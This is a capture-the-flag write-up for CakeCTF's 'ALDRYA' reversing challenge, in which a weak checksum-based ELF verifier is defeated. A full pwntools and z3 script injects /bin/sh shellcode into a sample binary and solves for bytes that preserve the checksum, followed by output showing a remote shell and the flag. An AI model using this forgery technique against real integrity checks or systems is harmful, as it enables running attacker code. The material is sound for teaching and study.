# ALDRYA

**Category**: rev \
**Points**: 214 points (18 solves) \
**Author**: ptr-yudai

I'm scared of executing a malicious ELF file. That's why I invented this new
ELF-verify system named ALDRYA.

```
nc misc.cakectf.com 10029
```

Attachments: `aldrya.tar.gz`

## Overview

We're given these files:
```
$ ls -lah
total 60K
drwxrwxr-x 2 plushie plushie 4.0K Aug 29 15:30 .
drwxr-xr-x 3 plushie plushie 4.0K Aug 29 15:30 ..
-rwxr-xr-x 1 plushie docker   18K Aug 26 22:37 aldrya
-rw-r--r-- 1 plushie docker   358 Aug 26 22:37 README.md
-rw-r--r-- 1 plushie docker   268 Aug 26 22:37 sample.aldrya
-rwxr-xr-x 1 plushie docker   17K Aug 26 22:37 sample.elf
-rw-r--r-- 1 plushie docker   547 Aug 26 22:37 server.py

$ ./aldrya
Usage: ./aldrya <ELF> <ALDRYA>

$ ./aldrya sample.elf sample.aldrya
Hello, Aldrya!
```

- `sample.elf` is a simple program that just prints `Hello, Aldrya!`.
- `sample.aldrya` contains a bunch of nonsense
- `aldrya` is what we have to reverse

## Solution

### Part 1: Reversing

Lucky for us, the `aldrya` program is written in C and symbols aren't stripped,
so it's pretty relaxing to reverse.

Basically it will open the ELF and ALDRYA file and do this:
```c
    res = validate(elf_fd, aldrya_fd);
    if (res != 0) {
      puts("[-] ELF file is not genuine");
      fclose(elf_fd);
      fclose(aldrya_fd);
      exit(1);
    }
```

Inside `validate()`, it does this:

```c
  n_read = fread(buf, 4, 1, elf_fd);
  if (
    (n_read == 1) &&
    (buf == 0x464c457f) && /* Check that it starts with `ELF` bytes */
    (size = validate_size(elf_fd,aldrya_fd), size != -1)
  ) {
    for (int i = 0; i < size; i++) {
      if (validate_chunk(elf_fd,aldrya_fd) != 0) return 1;
    }
    return 0;
  }
```

After a bit more reversing, we find that each chunk is `0x100` bytes. The first
four bytes of the ALDRYA file encodes the number of chunks in the ELF, which is
what `validate_size()` checks.

The `validate_chunk()` function reads 4 bytes from the ALDRYA file, which we'll
call a tag. Then it reads in `0x100` bytes from the ELF, and computes another tag like so:
```python
def calc_tag(buf):
    tag = 0x20210828
    i = 0
    for i in range(chunk_size):
        c = buf[i]
        tag = (tag ^ c) >> 1 | (((tag ^ c) & 1) ^ 1) << 31
    return tag
```

Then it verifies that the tags match.

### Part 2: Solving

So how do get the flag? If we check `server.py`, we see:
```python
        url = input('URL: ').strip()
        assert url.startswith('http'), "URL must start with `http`"

        f = tempfile.NamedTemporaryFile(delete=True)
        urllib.request.urlretrieve(url, f.name)
        os.chmod(f.name, 0o555)
        f.file.close()
        os.system(f'./aldrya {f.name} ./sample.aldrya')
```

So we can send it any ELF file, but it needs to validate with `sample.aldrya`.
Here's the plan:
- Replace code in the `_start()` function of `sample.elf` with shellcode
- Modify the rest of the chunk so that it produces the same tag

I implemented this with pwntools and z3:

```python
import pwn
import z3
import os

pwn.context.arch = "amd64"
chunk_size = 0x100


def calc_tag(buf):
    res = 0x20210828
    i = 0
    for i in range(chunk_size):
        c = buf[i]
        res = (res ^ c) >> 1 | (((res ^ c) & 1) ^ 1) << 31
    return res


def sym_calc_tag(buf):
    # Symbolically calculate the tag
    res = z3.BitVecVal(0x20210828, 32)
    i = 0
    for i in range(chunk_size):
        c = z3.ZeroExt(res.size() - buf[i].size(), buf[i])
        a = z3.LShR(res ^ c, 1)
        b = (((res ^ c) & 1) ^ 1) << 31
        res = a | b
    return res


def split_chunks(elf):
    return [elf[i : i + chunk_size] for i in range(0, len(elf), chunk_size)]


def find_chunk(chunks, needle):
    for i, chunk in enumerate(chunks):
        if needle in chunk:
            padded_chunk = chunk.ljust(chunk_size, b"\x00")  # calloc
            return i, chunk, calc_tag(padded_chunk)
    else:
        raise ValueError("Needle not found")


with open("sample.elf", "rb") as f:
    elf = f.read()

# These are the bytes in the `_start` function
needle = bytes.fromhex(
    "f30f1efa31ed4989d15e4889e24883e4f050544c8d0566010000488d0def000000488d3dc1000000ff15522f0000f490"
)

chunks = split_chunks(elf)
chunk_i, old_chunk, old_tag = find_chunk(chunks, needle)

tag = calc_tag(old_chunk)
assert tag == old_tag

needle_start = old_chunk.find(needle)

shcode = """mov rdi, 0x68732f6e69622f
push rdi
mov eax, 0x3b
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall
"""

shcode = pwn.asm(shcode)

sym_chunk = z3.BitVecs(" ".join([f"buf_{i}" for i in range(chunk_size)]), 8)

# Avoid clobbering code before our shellcode
for i in range(needle_start):
    sym_chunk[i] = z3.BitVecVal(old_chunk[i], 8)

# Add our shellcode
for i, b in enumerate(shcode):
    sym_chunk[needle_start + i] = z3.BitVecVal(shcode[i], 8)

sym_tag = sym_calc_tag(sym_chunk)

solver = z3.Solver()
solver.add(sym_tag == old_tag)

print(solver.check())
model = solver.model()

evil_chunk = bytes(model.evaluate(c).as_long() for c in sym_chunk)
assert calc_tag(evil_chunk) == old_tag

evil_chunks = chunks
evil_chunks[chunk_i] = evil_chunk
evil_elf = b"".join(evil_chunks)

with open("evil", "wb") as f:
    f.write(evil_elf)
    os.chmod(f.name, 0o755)
```

Output:
```
$ python solve.py
sat

$  nc misc.cakectf.com 10029
URL: http://a56e-67-149-218-244.ngrok.io/evil
ls /
bin
boot
dev
etc
flag-4c147adf5f7a18258f6709ed9402d902.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat /flag-4c147adf5f7a18258f6709ed9402d902.txt
CakeCTF{jUst_cH3ck_SHA256sum_4nd_7h47's_f1n3}
```
